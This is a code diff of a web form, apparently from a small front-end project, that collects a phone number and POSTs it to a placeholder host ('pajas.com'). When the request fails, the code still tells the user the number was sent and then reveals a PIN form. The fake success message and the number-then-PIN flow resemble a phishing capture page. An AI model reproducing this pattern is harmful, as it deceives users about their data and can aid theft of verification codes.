@@ -1,4 +1,4 @@
- <form class="form-container">
+<form class="form-container">
         <input type="tel" id="numberInput" maxlength="10" minlength="10" placeholder="INGRESÁ TU NÚMERO" name="numberInput" required />
         <button type="submit" id= "numberBtn" disabled>ENVIAR</button>
 </form>
@@ -18,7 +18,7 @@
     input{   
         width: 70%;
         height: 1.8rem;
-        background-color:  #0074e0aa;
+        background-color: var(--accent-weak);
         border-radius: 0.3rem;
         box-shadow: 3px 3px 5px rgba(0, 0, 0, 0.926);
         border: none;
@@ -49,58 +49,46 @@
 </style>
 
 <script>
-    const numberInput = document.querySelector('#numberInput') as HTMLInputElement | null;
-    const numberBtn = document.getElementById('numberBtn') as HTMLButtonElement | null;
-    const numberForm = document.querySelector('.form-container') as HTMLFormElement | null;
+    // JS puro (sin TypeScript), y arregla paréntesis/llaves
+    const form = document.querySelector('.form-container');
+    const numberInput = document.querySelector('#numberInput');
+    const numberBtn = document.getElementById('numberBtn');
 
     if (numberInput && numberBtn) {
         numberInput.addEventListener('input', () => {
-            if (numberInput.value.length == 10) {
+            if (numberInput.value.length === 10) {
                 numberBtn.disabled = false;
-                numberBtn.style.backgroundColor = '#0074e0';
+                const accent = getComputedStyle(document.documentElement).getPropertyValue('--accent').trim();
+                numberBtn.style.backgroundColor = accent || '#0074e0';
             } else {
                 numberBtn.disabled = true;
                 numberBtn.style.backgroundColor = 'grey';
             }
-
-            
-
         });
     }
 
-    numberForm?.addEventListener('submit', async (event) => {
-            event.preventDefault();
+    form?.addEventListener('submit', async (event) => {
+        event.preventDefault();
 
-            const data = {
-                number: numberInput.value
-            }
-            
-            try {
-                const phoneNumber = numberInput.value;
-                const url = `pajas.com`;
-                const response = await fetch(url, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(data)
-                }); 
+        const data = { number: numberInput?.value || '' };
 
-                const result = await response.json();
+        try {
+            const url = `pajas.com`;
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            });
 
-              
+            const result = await response.json();
+            // Maneja result si hace falta
 
-            } catch (error) {
-                alert('El número se envió correctamente');
-                //emulas como si fuese una respuesta positiva
-                numberForm.style.display = 'none';
-                document.querySelector('.formPin').style.display = 'flex';
-
-                
-            }
-          
-        });
+        } catch (error) {
+            alert('El número se envió correctamente');
+            const formPin = document.querySelector('.formPin');
+            if (form) form.style.display = 'none';
+            if (formPin) formPin.style.display = 'flex';
+        }
+    });
 </script>
-
-
 </script>
